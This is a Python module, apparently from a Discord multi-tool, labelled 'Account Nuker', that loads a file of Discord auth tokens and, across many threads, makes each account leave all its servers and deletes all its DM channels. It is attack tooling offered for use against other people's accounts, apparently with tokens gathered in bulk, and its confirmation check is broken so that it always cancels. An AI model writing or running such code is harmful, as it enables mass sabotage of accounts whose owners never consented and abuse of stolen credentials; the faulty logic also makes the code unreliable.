import os
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore

import modules.rpc_manager as rpc_manager
rpc_manager.set_details("Discord: Account Nuker")

class AccountNuker:
    def __init__(self, parent):
        self.parent = parent
        
    def nuke_account(self, token):
        try:
            headers = {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
            if guilds_response.status_code == 200:
                guilds = guilds_response.json()
                for guild in guilds:
                    try:
                        requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild["id"]}', headers=headers)
                        print(f"{Fore.GREEN}{'Left from server:'} {guild['name']} - {token[:20]}...")
                    except:
                        pass
                        
            channels_response = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
            if channels_response.status_code == 200:
                channels = channels_response.json()
                for channel in channels:
                    try:
                        requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=headers)
                        print(f"{Fore.GREEN}{'DM deleted:'} {token[:20]}...")
                    except:
                        pass
                        
            print(f"{Fore.GREEN}{'Account nuked:'} {token[:20]}...")
            with self.parent.lock:
                self.parent.stats['nuked'] += 1
            return True
            
        except Exception as e:
            print(f"{Fore.RED}✗ {'Error:'} {token[:20]}... - {str(e)}")
            
        time.sleep(self.parent.delay_between_requests)
        return False
    
    def run(self):
        self.parent.clear_screen()
        self.parent.print_banner()
        
        print(f"{Fore.CYAN}{'ACCOUNT NUKER'}")
        print(f"{Fore.MAGENTA}{'='*30}")
        print(f"{Fore.RED}{'⚠️  WARNING: This operation cannot be undone!'}")
        print(f"{Fore.RED}{'⚠️  Will leave all servers and delete DMs!'}")
        
        confirm = input(f"\n{Fore.YELLOW}{'Are you sure you want to continue? (Y/N DEF -> Y):'} ").strip()
        
        if confirm != "Y" or confirm != "":
            print(f"{Fore.GREEN}{'Operation cancelled.'}")
            input(f"\n{Fore.YELLOW}{'Press Enter to continue...'}")
            return
            
        valid_tokens = []
        if os.path.exists(self.parent.valid_tokens_file):
            with open(self.parent.valid_tokens_file, 'r', encoding='utf-8') as f:
                valid_tokens = [line.strip() for line in f.readlines() if line.strip()]
        
        if not valid_tokens:
            print(f"{Fore.RED}{'Valid token file not found!'}")
            input(f"\n{Fore.YELLOW}{'Press Enter to continue...'}")
            return
            
        threads = min(int(input(f"{Fore.YELLOW}{'Thread count (1-'}{self.parent.max_threads}{'):'} ") or "5"), self.parent.max_threads)
            
        print(f"\n{Fore.RED}{'Account nuke starting...'}")
        print(f"{Fore.CYAN}{'Token Count:'} {len(valid_tokens)}")
        print(f"{Fore.CYAN}{'Thread Count:'} {threads}\n")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for token in valid_tokens:
                future = executor.submit(self.nuke_account, token)
                futures.append(future)
                
            nuked_count = 0
            for future in futures:
                try:
                    if future.result():
                        nuked_count += 1
                except Exception as e:
                    print(f"{Fore.RED}{'Error:'} {e}")
                    
        print(f"\n{Fore.GREEN}✓ Total {nuked_count} accounts nuked!")
        input(f"\n{Fore.YELLOW}{'Press Enter to continue...'}")
